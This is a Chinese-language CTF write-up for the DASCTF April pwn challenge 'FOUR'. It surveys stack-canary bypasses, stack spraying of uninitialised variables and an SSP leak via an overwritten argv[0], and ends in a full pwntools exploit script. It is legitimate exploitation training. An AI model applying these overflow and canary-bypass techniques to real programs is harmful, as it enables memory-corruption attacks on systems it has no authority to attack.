@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>DASCTF APR | SOME PEDLARY OF MAHO(please be brave and keep running)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="description" content="DASCTTF WRITE UPFOUR考察点：
+canary的绕过方式
+代码的硬审计能力
+”栈喷射“脏数据感染未初始化数据
+
+安全检测：
+
+全RELRO，则got表不可改
+存在canary，对应题设。
+堆栈可执行，但有canary
+无地址随机化，
+
+关于canary的几种绕过方式：
+什么是cana">
+  
+  
+  
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+  
+  <link rel="stylesheet" href="../../../../css/style.css">
+  
+    <link rel="stylesheet" href="../../../../fancybox/jquery.fancybox-1.3.4.css">
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div id="nav-outer">
+  <nav id="main-nav" class="outer">
+    <a id="main-nav-toggle" class="nav-icon"></a>
+    
+      <a class="main-nav-link" href="../../../../index.html">Home</a>
+    
+      <a class="main-nav-link" href="../../../../archives">Archives</a>
+    
+      <a class="main-nav-link" href="../../../../about">About</a>
+    
+    <div class="main-nav-space-between"></div>
+    
+  </nav>
+</div>
+<div id="header-title">
+  <h1 id="logo-wrap">
+    <a href="../../../../index.html" id="logo">SOME PEDLARY OF MAHO(please be brave and keep running)</a>
+  </h1>
+  
+</div>
+
+      <div id="content" class="outer">
+        <section id="main"><article id="post-DASCTF APR" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time class="dt-published" datetime="2023-04-26T07:46:24.000Z" itemprop="datePublished">2023-04-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/CTF-PWN/">CTF-PWN</a>►<a class="article-category-link" href="../../../../categories/CTF-PWN/DASCTF/">DASCTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      DASCTF APR
+    </h1>
+  
+
+      </header>
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="DASCTTF-WRITE-UP"><a href="#DASCTTF-WRITE-UP" class="headerlink" title="DASCTTF WRITE UP"></a>DASCTTF WRITE UP</h1><h2 id="FOUR"><a href="#FOUR" class="headerlink" title="FOUR"></a>FOUR</h2><h3 id="考察点："><a href="#考察点：" class="headerlink" title="考察点："></a>考察点<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h3><ol>
+<li>canary的绕过方式</li>
+<li>代码的<strong>硬</strong>审计能力</li>
+<li><span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>栈喷射<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>脏数据感染未初始化数据</li>
+</ol>
+<h4 id="安全检测："><a href="#安全检测：" class="headerlink" title="安全检测："></a>安全检测<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h4><p><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA1.png?raw=true" alt="DA1.png"></p>
+<ol>
+<li>全RELRO<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则got表不可改</li>
+<li>存在canary<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>对应题设<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>堆栈可执行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>但有canary</li>
+<li>无地址随机化<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></li>
+</ol>
+<h4 id="关于canary的几种绕过方式："><a href="#关于canary的几种绕过方式：" class="headerlink" title="关于canary的几种绕过方式："></a>关于canary的几种绕过方式<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h4><ol>
+<li>什么是canary<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><ol>
+<li>canary是一种栈保护机制<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>是操作系统在bp指针的一个低地址单元插入的一串随机数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>在栈函数流程执行完后<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则拿出canary在栈上的数据和原canary值比对<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>若相同则透明<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>若不同则报错<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA2.PNG?raw=true" alt="DA2.PNG"></li>
+</ol>
+</li>
+<li>绕过方法一<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>泄漏canary<ol>
+<li>格式化字符串泄漏栈数据中的canary<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></li>
+<li>相同的函数调用时调用相同canary<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>借助其他函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>或篡改的rop链读出canary</li>
+<li>无已知printf函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>无法构造rop链<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则不行</li>
+</ol>
+</li>
+<li>绕过方法二<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>fork函数爆破<ol>
+<li>对fork而言<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>作用相当于自我复制<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>每一次复制出来的程序<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>内存布局都是一样的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>当然canary值也一样<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>  </li>
+<li>逐字节爆破<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>fork函数为一个特殊函数拥有两个返回三种状态<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>&gt;0返回父函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>&#x3D;&#x3D; 0继续子进程<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>&lt;0发生错误<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>两反三态<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></li>
+<li>逐字节进行循环<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>若和已有canary不同<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则错误<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>开启一个新的子进程<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>若符合<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则读取已有之后的canary<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>脚本进行接收符合条件<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>并进行下一字节循环的爆破<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>直到探明为止<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>无fork函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则不行</li>
+</ol>
+</li>
+<li>绕过方法三<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>got表篡改<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>恶意触发canary错误<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>调用目标函数<ol>
+<li>若___stack_chk_fail() got表可改<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则可考虑篡改got表为目标函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而满足功能如<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>get shell &#x2F;open flag</li>
+<li>full RELROgot表不可改<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>不行</li>
+</ol>
+</li>
+<li>绕过方式四<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>___stack_chk_fail()  argv[0]  可控<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则恶意触发canary错误<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>打印栈中数据<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>SSP LEAK<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><ol>
+<li>argv[0]是指向第一个启动参数字符串的指针 <span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将其篡改为目标地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则可读出栈中内容</li>
+<li>该题采用本方法进行flag读出<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+</ol>
+</li>
+</ol>
+<h4 id="IDA反编译看下：（重点是过硬的代码审计能力）"><a href="#IDA反编译看下：（重点是过硬的代码审计能力）" class="headerlink" title="IDA反编译看下：（重点是过硬的代码审计能力）"></a>IDA反编译看下<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>重点是过硬的代码审计能力<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></h4><p>–&gt;已将重要变量重命名以及流程代码的标注</p>
+<p><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA3.png?raw=true" alt="DA3.png"></p>
+<ol>
+<li>main函数的几个分支选项——–&gt;菜单页面</li>
+</ol>
+<p><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA4.png?raw=true" alt="DA4.png"></p>
+<ol start="2">
+<li>choose  1   ——–&gt; 读出printf的got表地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>可进行leak_libc但关闭标准错误<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>因为ssp需要抛出错误信息<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>若关闭则使得ssp失效<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></li>
+</ol>
+<p><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA5.png?raw=true" alt="DA5.png"></p>
+<ol start="3">
+<li><p>choose 2 ———-&gt;调用一个可开极大栈空间的函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>之后将输入内容加密输出<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>看似没用但这里正是做题关键点<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>栈喷射<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<ol>
+<li>栈喷射是个大而宽泛的概念<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>主要应用于极大空间的栈溢出的内容的构造<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>shellcode的nop sled以及前后栈帧非初始化变量的感染都属于栈喷射<br><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA6.png?raw=true" alt="DA6.png"><br><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA7.png?raw=true" alt="DA7.png"></li>
+</ol>
+</li>
+<li><p>choose 3 ———&gt; 官方提示的目标危险函数</p>
+<ol>
+<li>函数操作<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>将传入的前几个参数进行加密<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并输入文件名以开启复制有s1变量读入的dest变量<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>调试output.txt存在为空<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则dest可未初始化<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>若被从前栈帧上的脏数据感染则可open flag<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+</ol>
+</li>
+</ol>
+<p><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA8.png?raw=true" alt="DA8.png"></p>
+<ol start="2">
+<li>脚本调试<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><ol>
+<li>向choose2喷射满<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>flag\x00<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>字符</li>
+<li>当函数调用完成<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>栈空间释放<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>上一个函数的数据实际并不被擦除或覆盖<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>这些数据仍然存在于栈上<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>只是不被当前函数在访问<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>标记为删除<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>若下个函数重新申请空间<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则再将栈空间内存进行初始化覆盖<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>这里若下一个函数的变量未进行初始化<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则会被上一个栈帧的脏数据感染赋值<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>空安全<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></li>
+<li>脚本调试与结果<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+</li>
+</ol>
+<pre><code>from pwn import *
+p=process(&#39;/home/lilbc/桌面/pwn1&#39; )
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+p.sendlineafter(b&quot;your choice : \n&quot;,str(2))
+p.sendlineafter(b&quot;You can give any value, trust me, there will be no overflow\n&quot;,str(24559))
+gdb.attach(p)
+pause()
+payload=b&#39;aa&#39;+b&#39;flag\x00&#39;*0x1320
+p.sendlineafter(b&quot;Actually, this function doesn&#39;t seem to be useful\n&quot;,payload)
+
+p.sendlineafter(b&quot;Really?\n&quot;,b&#39;n&#39;)
+
+p.sendlineafter(b&quot;your choice : \n&quot;,str(3))
+p.sendlineafter(b&quot;Enter level:&quot;,str(2))
+gdb.attach(p)
+pause()
+</code></pre>
+<p><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA9.png?raw=true" alt="DA9.png"><br>choose 2 的canary地址落于<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>0xc1850<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA10.png?raw=true" alt="DA10.png"><br>choose 3 的canary落于<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>0xc1760<br>两函数栈帧几乎重叠开启<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从二图中也见栈帧也已被flag脏数据感染<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>若flag\x00字符串读入未初始化变量dest<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则open flag</p>
+<p><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA11.png?raw=true" alt="DA11.png"></p>
+<ol start="4">
+<li>choose 4 ———&gt; 一个需要构造参数的read函数<ol>
+<li>主要考察是否对asc码敏感<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>先给出asc表进行参考</li>
+</ol>
+</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/20200728090157350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY2MzkwNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ol start="2">
+<li>fd 文件描述符<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><ol>
+<li>文件检测符检测到~号使得数组i[]中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>第二个参数的asc码—0的asc码的值<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>赋为文件描述符</li>
+<li>如<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>51-48&#x3D;3</li>
+</ol>
+</li>
+<li>v6 read地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+<ul>
+<li>在检查一个字符数组 <strong>i</strong> 中的某个位置 <strong>j</strong> 是否满足以下条件<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+<li>位置 <strong>j</strong> 上的字符是冒号<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span><strong>:</strong><span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>位置 <strong>j + 1</strong><span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><strong>j + 2</strong> 和 <strong>j + 3</strong> 上都有字符<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>位置 <strong>j + 4</strong> 上没有字符<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+</ul>
+<p>如果满足这些条件<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>那么代码会执行以下操作<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></p>
+<ul>
+<li>将变量 <strong>v6</strong> 的低字节设置为位置 <strong>j + 1</strong> 上的字符<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>	</li>
+<li>将变量 <strong>v6</strong> 的次低字节设置为位置 <strong>j + 2</strong> 上的字符<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>将变量 <strong>v6</strong> 的高字设置为位置 <strong>j + 3</strong> 上的字符<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>将其转换为无符号整数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>跳出循环<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+</ul>
+<ol start="4">
+<li>v1 <span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>长度<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><ol>
+<li>检测到@和*符号之间有⼩写字母a~z 把⼩写字母的ascii码作为写⼊长度</li>
+</ol>
+</li>
+<li>choose 5—–&gt;栈溢出 ssp触发器</li>
+</ol>
+<h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h4><ul>
+<li>choose 2写脏数据<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>感染choose 3的dest变量<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将flag读出<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>调用choose 4 read函数将flag变量读到已知栈内存中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>通过choose5将arg[v0]值改为上方法写入的flag地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>即可触发SSP<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而get flag<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>IDA测出arg[v0]的偏移为<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>0x10+0xdef0-0xe008&#x3D;0x128<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>手动调试是0x118<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li><img src="https://github.com/Mahoyeye/blogImage/blob/main/DA13.png?raw=true" alt="DA13.png"></li>
+</ul>
+<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h4><pre><code class="python">from pwn import *
+#p=remote(&#39;node4.buuoj.cn&#39;,26153)
+p=process(&#39;/home/lilbc/桌面/pwn1&#39; )
+#libc=ELF(&#39;./libc.so.6&#39;)
+#elf = ELF(&#39;./pwn1&#39;)
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+p.sendlineafter(b&quot;your choice : \n&quot;,str(2))
+p.sendlineafter(b&quot;You can give any value, trust me, there will be no overflow\n&quot;,str(24559))
+payload=b&#39;aa&#39;+b&#39;flag\x00&#39;*0x1320
+p.sendlineafter(b&quot;Actually, this function doesn&#39;t seem to be useful\n&quot;,payload)
+p.sendlineafter(b&quot;Really?\n&quot;,b&#39;n&#39;)
+gdb.attach(p)
+pause()
+p.sendlineafter(b&quot;your choice : \n&quot;,str(3))
+p.sendlineafter(b&quot;Enter level:&quot;,str(2))
+gdb.attach(p)
+pause()
+p.sendlineafter(b&quot;Enter mode:&quot;,str(2))
+p.sendlineafter(b&quot;Enter X:&quot;,str(3))
+payload=b&#39;a&#39;*0x10
+p.sendlineafter(b&quot;Enter a string: &quot;,payload)
+p.sendlineafter(b&quot;please input filename\n&quot;,&#39;output.txt&#39;)
+
+
+p.sendlineafter(b&quot;1. yes\n2.no\n&quot;,str(2))
+
+p.sendlineafter(b&quot;your choice : \n&quot;,str(4))
+payload=b&#39;11&gt;:`!!&gt;@a*&gt;~3&#39;
+p.sendlineafter(&#39;info&gt;&gt;\n&#39;,payload)
+
+p.sendlineafter(b&quot;your choice : \n&quot;,str(5))
+payload=b&#39;a&#39;*0x118+p64(0x602121)
+p.sendlineafter(b&quot;This is a strange overflow. Because of canary, you must not hijack the return address\n&quot;,payload)
+
+p.interactive()
+</code></pre>
+<p>引用参考zsnick师傅<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/130309288">https://blog.csdn.net/mochu7777777/article/details/130309288</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="../../21/CANARY%E7%88%86%E7%A0%B4/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Viejo</strong>
+      <div class="article-nav-title">
+        
+          CANARY爆破
+        
+      </div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+    <aside id="sidebar" class="outer">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Posts recientes</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="">DASCTF APR</a>
+          </li>
+        
+          <li>
+            <a href="../../21/CANARY%E7%88%86%E7%A0%B4/">CANARY爆破</a>
+          </li>
+        
+          <li>
+            <a href="../../15/bss/">bss段上的格式化字符串处理</a>
+          </li>
+        
+          <li>
+            <a href="../../08/pwnable_orw%EF%BC%88%E9%87%8D%E7%82%B9%E4%B8%BA%E6%89%8B%E5%86%99shellcode%E4%B8%8E%E6%B2%99%E7%9B%92orw%E6%9C%BA%E5%88%B6%EF%BC%89/">pwnable_orw（重点为手写shellcode与沙盒orw机制）</a>
+          </li>
+        
+          <li>
+            <a href="../../08/%E7%AE%80%E8%AE%B0%E5%BD%95%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E9%80%94%E4%B8%AD%E5%A4%8D%E4%B9%A0%E6%B1%87%E7%BC%96%E7%9A%84%E6%B5%81%E7%A8%8B/">简记录栈迁移学习途中复习汇编的流程</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categorías</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/CG/">CG</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/CTF-PWN/">CTF-PWN</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/CTF-PWN/DASCTF/">DASCTF</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  
+</aside>
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 cy<br>
+      Construido por <a href="https://hexo.io/" target="_blank">Hexo</a><br>
+      
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="../../../../about" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+
+<script src="../../../../js/clipboard.min.js"></script>
+<script src="../../../../js/jquery-1.4.3.min.js"></script>
+
+<script src="../../../../fancybox/jquery.fancybox-1.3.4.pack.js"></script>
+
+
+<script src="../../../../js/script.js"></script>
+
+
+
+
+
+
+<script>
+  MathJax = {
+    options: {
+      enableMenu: false
+    },
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    }
+  };
+</script>
+<!-- <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+    CommonHTML: {
+      linebreaks: false
+    }
+  });
+  </script> -->
+<script type="text/javascript" id="MathJax-script" async
+  src="../../../../mathjax/tex-chtml.js">
+</script>
+<!-- <script type="text/javascript"
+   src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS_CHTML">
+</script> -->
+
+
+
+  </div>
+</body>
+</html>
